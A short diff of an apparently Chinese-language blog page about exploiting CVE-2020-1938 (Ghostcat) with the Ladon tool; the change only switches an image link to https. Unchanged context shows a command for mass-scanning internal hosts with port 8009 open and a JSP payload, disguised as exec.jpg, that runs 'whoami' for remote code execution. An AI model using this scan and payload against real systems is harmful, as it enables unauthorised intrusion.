@@ -215,7 +215,7 @@
 
 <h3 id="批量内网"><a href="#批量内网" class="headerlink" title="批量内网"></a>批量内网</h3><p>把开放8009端口的IP放进ip.txt，执行以下命令即可批量扫描<br>当然也可以不扫端口和不扫存活IP，直接ip24.txt扫描批量C段</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Ladon cve-2020-1938.ini</span><br></pre></td></tr></table></figure>
-<p>以下为内网实战批量检测结果<br><img alt="img" data-original="http://k8gege.org/k8img/Ladon/exp/CVE-2020-1938.png"></p>
+<p>以下为内网实战批量检测结果<br><img alt="img" data-original="https://k8gege.org/k8img/Ladon/exp/CVE-2020-1938.png"></p>
 <h3 id="文件包含RCE"><a href="#文件包含RCE" class="headerlink" title="文件包含RCE"></a>文件包含RCE</h3><p>一定条件下可实现RCE，如有地方实现文件上传，往目标传个exec.jpg,内容如下，执行whoami</p>
 <figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;%out.println(<span class="keyword">new</span> java.io.BufferedReader(<span class="keyword">new</span> java.io.InputStreamReader(Runtime.getRuntime().exec(<span class="string">"whoami"</span>).getInputStream())).readLine());%&gt;</span><br></pre></td></tr></table></figure>
 
